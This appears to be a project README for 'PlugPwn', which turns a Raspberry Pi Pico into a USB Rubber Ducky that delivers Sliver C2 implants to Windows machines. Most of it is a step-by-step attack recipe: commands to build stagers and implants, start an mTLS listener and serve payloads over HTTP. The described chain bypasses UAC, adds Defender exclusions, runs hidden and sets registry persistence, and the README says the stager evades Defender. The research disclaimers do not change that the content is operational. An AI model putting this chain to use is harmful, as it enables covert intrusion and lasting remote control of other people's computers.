# PlugPwn
This project implements a hardware-based attack vector using a Raspberry Pi Pico configured as a USB Rubber Ducky, combined with the Sliver Command & Control (C2) framework. The implementation provides initial access, UAC bypass, and persistence mechanisms on Windows systems.

## ⚖️ Disclaimer

This repository is intended for **authorized cybersecurity research, education, penetration testing, malware analysis, and defensive security testing**.

The author does not encourage unauthorized access, persistence, credential theft, malware deployment, or disruption of systems.

Always obtain explicit authorization before testing a system.

**Use isolated laboratory environments whenever possible.**

## 🎯 Learning Objectives

After completing this laboratory, you should understand:

- How HID-based attacks can begin an execution chain
- How Windows scripting engines can be chained
- How multi-stage payload architectures work
- Why UAC is an important security boundary
- How security-control modification can be detected
- How C2 infrastructure communicates with an endpoint
- How Windows persistence can be identified
- What telemetry defenders can use to detect the activity
- Why isolated environments are important when researching offensive tooling

## Prerequisites

### Hardware Requirements

- Raspberry Pi Pico
- USB type A to type B cable having data transfer capablility

### Kali Linux Dependencies

#### 1. Sliver Framework

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://sliver.sh/install | sudo bash

┌──(kali㉿kali)-[~]
└─$ sliver
```

#### 2. Nim & Mingw-w64

```bash
┌──(kali㉿kali)-[~]
└─$ sudo apt install nim -y
┌──(kali㉿kali)-[~]
└─$ sudo apt install mingw-w64 -y
┌──(kali㉿kali)-[~]
└─$ nimble install winim -y
```

#### 3. Visual Studio (Windows VM Required)

Download and install Visual Studio Community with "**Desktop development with C++**" workload.

## Project Structure

### File Locations

Ensure all files are placed in their designated locations as shown in the project structure above.

```
├── pico/
│   ├── payload.dd           # Ducky Script initial execution
│   ├── launcher.vbs         # VBScript orchestrator
│   ├── open.ps1            # PowerShell downloader
│   └── bypass.exe          # UAC bypass (compiled)
│
├── /home/kali/c2/
│   ├── stager.exe          # Sliver stager (generated)
│   ├── hidden.vbs          # Persistence launcher
│   ├── persistence.exe     # Sliver implant (generated)
│   └── update.bin          # Update payload (optional)
```

## Setup Instructions

### Configuration Notes

#### Important: IP Address Configuration

**Replace `<attacker's IP>` with your Kali machine's IP in all files where it appears.**

### 1. Pico Initial Setup

Follow the official guide: Pico-Ducky Setup

### 2. Generate bypass.exe

Open "**x64 Native Tools Command Prompt for VS**":

```bash
C:\Program Files\Microsoft Visual Studio\18\Community> cl.exe bypass.c
```

### 3. Generate stager.exe

```bash
┌──(kali㉿kali)-[~/c2]
└─$ nim c -d:release -d:mingw --os:windows --cpu:amd64 \
  --cc:gcc \
  --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  /home/kali/c2/stager.nim
```

### 4. Start Sliver Server

```bash
┌──(kali㉿kali)-[~/c2]
└─$ sliver

┌──(kali㉿kali)-[~]
└─$ [127.0.0.1] sliver > mtls -L <attacker's IP> -l 443
```

### 5. Generate update.bin

```bash
┌──(kali㉿kali)-[~]
└─$ [127.0.0.1] sliver > generate --mtls <attacker's IP>:443 --os windows --arch amd64 --format shellcode --save /home/kali/c2/update.bin
```

### 6. Generate persistence.exe

```bash
┌──(kali㉿kali)-[~]
└─$ [127.0.0.1] sliver > generate --mtls <attacker's IP>:443 --os windows --save /home/kali/c2/persistence.exe
```

### 7. Start HTTP Server

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
```

## Attack Chain Workflow

1. **Initial Execution**: When the Pico device is plugged in, `payload.dd` executes `launcher.vbs`
2. **UAC Bypass**: `launcher.vbs` runs `bypass.exe` which:
    - Bypasses Windows UAC
    - Adds current user's `AppData\Roaming` folder to Defender exclusions
3. **Payload Download**: Waits 10 seconds, then downloads `hidden.vbs` and `persistence.exe`
4. **Shell Access**: Executes `stager.exe` providing the attacker with a Sliver session
5. **Persistence**: `open.ps1` adds `hidden.vbs` to registry for persistence after restart

## ⚠️ Important Behavioral Notes
The bypass.exe file serves a single, specific purpose: disabling Windows Defender real‑time protection for the %AppData%\Roaming folder. This is strictly required to allow the persistence.exe implant and hidden.vbs launcher to remain on disk without being quarantined after a system reboot.

The initial stager session is already fully undetected: The stager.exe payload executed directly by the Pico provides a working Sliver session without needing bypass.exe at all. The stager and core implant are built using Sliver’s default evasion techniques and are completely undetected by Windows Defender at the time of execution.

bypass.exe is not required for initial access: You will get a shell immediately after stager.exe runs. The UAC bypass is only necessary to maintain long‑term persistence, as Windows Defender would otherwise flag the saved persistence.exe file on disk during scheduled scans after a restart.

## Usage

1. Configure all IP addresses in scripts and commands
2. Generate all required executables
3. Place files in correct directories
4. Start the Sliver listener
5. Start the HTTP server
6. Deploy the Pico device

## Security Considerations

- All operations run in background/hidden windows
- Defender exclusions are added to prevent detection
- Persistence ensures continued access after system restart

## References

- Pico-Ducky GitHub Repository: https://github.com/dbisu/pico-ducky
- Sliver C2 Framework: https://sliver.sh/
- Nim: https://nim-lang.org/
- MinGW-w64: https://www.mingw-w64.org/
- Microsoft Visual Studio: https://visualstudio.microsoft.com/

## 🧹 Cleanup

After completing the experiment:

1. Terminate the Sliver session.
2. Stop the laboratory HTTP server.
3. Remove generated laboratory files from the Windows VM.
4. Remove persistence mechanisms.
5. Restore modified security settings.
6. Disconnect the Pico-Ducky.
7. Revert the Windows VM to its clean snapshot.
8. Remove temporary build artifacts from Kali if no longer required.

## Attribution & Disclaimer

This project includes modified code originally written by redcivet for the UAC bypass method (source: https://github.com/redcivet/uac-bypass-method59-wd-exclude).
The modified portions of the original code are contained exclusively within the bypass.c source file (which compiles to bypass.exe) located in the /pico/ directory of this repository.
All other scripts, payloads, and implementation files (including payload.dd, launcher.vbs, open.ps1, stager.nim, hidden.vbs, and the Sliver generation commands) are my own original work, generated by standard toolchains, or otherwise independently sourced.
The original code was used without an explicit license. This project is for educational and authorized testing purposes only. If you are the original author and object to this usage, please contact me.
